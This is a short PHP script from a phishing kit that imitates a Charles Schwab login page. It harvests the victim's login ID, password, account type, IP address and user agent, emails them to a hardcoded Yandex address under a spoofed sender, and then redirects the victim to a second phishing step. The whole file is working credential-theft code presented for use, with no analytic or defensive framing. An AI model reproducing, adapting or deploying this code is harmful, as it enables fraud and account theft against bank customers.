<?php
if($_POST["usr"] != "" and $_POST["psw"] != ""){
$ip = getenv("REMOTE_ADDR");
$Ok= "loganresult@yandex.com"; // Put Your Emails Here
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$fuck  .= "--------------Schwab Info-----------------------\n";
$fuck  .= "Login ID            : ".$_POST['usr']."\n";
$fuck  .= "Password           : ".$_POST['psw']."\n";
$fuck  .= "Account           : ".$_POST['type']."\n";
$fuck  .= "|--------------- I N F O | I P -------------------|\n";
$fuck  .= "|Client IP: ".$ip."\n";
$fuck  .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$fuck  .= "User Agent : ".$useragent."\n";
$subject = "Schwb Email $ip";
$headers = "From: Schwb <codx@xject.com>";
mail($Ok,$subject,$fuck,$headers);
Header ("Location: step2.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}
?>